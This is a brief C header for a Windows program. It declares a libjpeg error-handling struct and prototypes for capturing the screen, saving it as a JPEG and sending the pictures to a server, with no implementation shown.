// screencapture.h
#ifndef SCREENCAPTURE_H
#define SCREENCAPTURE_H

#include <windows.h>
#include "jpeglib.h"
#include <setjmp.h>

// Definición de estructuras
struct my_error_mgr {
    struct jpeg_error_mgr pub; // JPEG error manager
    jmp_buf setjmp_buffer;     // Buffer for longjmp to return to for error handling
};

// Prototipos de funciones
void my_error_exit(j_common_ptr cinfo);
void SaveJPEG(HBITMAP hBitmap, LPCSTR filename);
void CaptureAndSaveScreenshot();
void SendPicturesToServer();
#endif 
